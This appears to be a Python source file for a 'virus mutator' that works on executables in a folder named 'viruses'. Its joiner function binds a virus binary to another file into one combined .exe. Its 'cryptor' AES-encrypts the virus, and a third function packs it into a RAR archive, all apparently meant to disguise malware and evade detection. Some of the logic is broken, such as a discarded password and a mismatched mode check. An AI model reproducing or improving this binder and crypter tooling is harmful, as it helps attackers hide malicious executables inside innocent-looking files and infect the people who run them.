import pyAesCrypt
import os
import base64
import random


class File:
    def __init__(self, name):
        self.name = name
        self.extension = os.path.splitext(self.name)[1]

    def create_py_file(file1, file2):
        with open('C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/virus/' + file1.name, 'rb') as file_n1:
            with open('C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/' + file2.name, 'rb') as file_n2:
                with open('C:/Users/vpust/OneDrive/Desktop/Unior/viruses/mutator/py_file.py', 'w') as py_file:
                    py_file.write('''import os, base64

def join(file,file_name):
    with open('C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/' + file_name, "ab") as output_file:
        encode = base64.b64decode(file)
        output_file.write(encode)

file1 = %s
file2 = %s
join(file1, "%s.exe") 
join(file2, "%s.exe")''' % (base64.b64encode(file_n1.read()), base64.b64encode(file_n2.read()),
                            "MUT"+file1.name.split('.')[0] + "WITH" + file2.name.split('.')[0],
                            "MUT"+file1.name.split('.')[0] + "WITH" + file2.name.split('.')[0]))
    @staticmethod
    def compile():
        os.system('python3.8 C:/Users/vpust/OneDrive/Desktop/Unior/viruses/mutator/py_file.py')


def joiner(virus: str, file: str):
    file1 = File(virus)
    file2 = File(file)
    File.create_py_file(file1, file2)
    File.compile()
    return "MUT"+file1.name.split('.')[0] + "WITH" + file2.name.split('.')[0] + ".exe"


def cryptor(file: str):
    password = str(random.randint(1024, 32768))
    bufferSize = 64 * 1024
    try:
        open("virus.exe", encoding="utf-8", mode='a').close()
        pyAesCrypt.encryptFile("C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/virus/"+str(file),
                               "C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/MUT" + file.split('.')[0] + ".exe",
                               password, bufferSize)
    except FileNotFoundError:
        print("File not found!")
    return "MUT" + file.split('.')[0] + ".exe"
    
        
def WinRAR(file: str):
    source = 'C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/virus/{}'.format(file)
    target_dir = 'C:/Users/vpust/OneDrive/Desktop/Unior/viruses/buffer/MUT' + file.split('.')[0]
    rar_command = '"c:/program files/winrar/rar.exe" a {}.rar {}'.format(target_dir, source)
    os.system(rar_command)
    return 'MUT' + file.split('.')[0] + '.rar'


def mutator(virus: str, mut: int, file=None):
    mutation = ''
    if mut == '1':
        mutation = joiner(virus, file)
    elif mut == '2':
        mutation = cryptor(virus)
    elif mut == '3':
        mutation = WinRAR(virus)
    return mutation
